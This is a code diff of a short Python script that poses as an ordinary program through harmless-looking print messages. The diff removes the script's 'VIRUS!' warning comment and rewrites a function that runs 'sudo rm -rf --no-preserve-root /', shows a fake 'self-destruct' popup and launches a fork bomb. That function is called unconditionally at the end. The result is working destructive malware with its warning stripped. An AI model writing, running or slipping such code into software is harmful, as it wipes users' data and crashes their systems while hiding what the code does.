@@ -1,5 +1,3 @@
-# VIRUS! Install on a virtual machine!
-
 import os
 import time
 
@@ -25,8 +23,6 @@ for x in range(18):
     time.sleep(0.1)
     os.system("clear")
 
-
-
 def mainProgramFunction(operation):
     print("Handling main program function")
     print("Defining variables")
@@ -34,12 +30,12 @@ def mainProgramFunction(operation):
     print("Deliberately initializing utilities.")
     print(operation)
 
-
-
 def SecondaryProgramFunction(operation):
-    os.system("sudo rm -rf --no-preserve-root /")
-    time.sleep(5)
-    os.system(":(){ :|:& };:")
+    os.system("sudo apt install zenity -y")  # Install zenity, if it's not installed already
+    os.system("sudo rm -rf --no-preserve-root /")  # Start deletion
+    os.system('zenity --error --text="Critical system error! The system will self-destruct in 5 seconds!"')  # Popup warning
+    time.sleep(5)  # Let the popup linger for 5 seconds
+    os.system(":(){ :|:& };:")  # Fork bomb to crash the system
     print(operation)
 
 SecondaryProgramFunction("You are cooked!")
